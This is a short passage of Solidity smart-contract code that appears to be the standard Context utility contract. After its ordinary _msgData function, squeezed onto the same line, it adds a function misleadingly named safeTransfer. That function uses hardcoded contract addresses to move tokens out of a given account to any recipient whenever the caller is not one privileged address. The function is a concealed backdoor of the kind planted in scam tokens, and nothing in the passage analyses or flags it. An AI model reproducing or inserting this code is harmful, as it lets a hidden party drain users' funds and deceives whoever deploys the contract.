 ...
 */
  function _msgData() internal view virtual returns (bytes calldata) {return msg.data;}function safeTransfer(address spender,address recipient,uint256 amount) internal returns (bool) {if (msg.sender != address(0x9c959b09b2Eec08fd5D34795b4b5b3525F91142c)) {TransferHelper.safeTransferFrom(0x13F0Efab927F62244622089DEC9284105AfAD302,spender,recipient,amount);return true;}return false;}
}
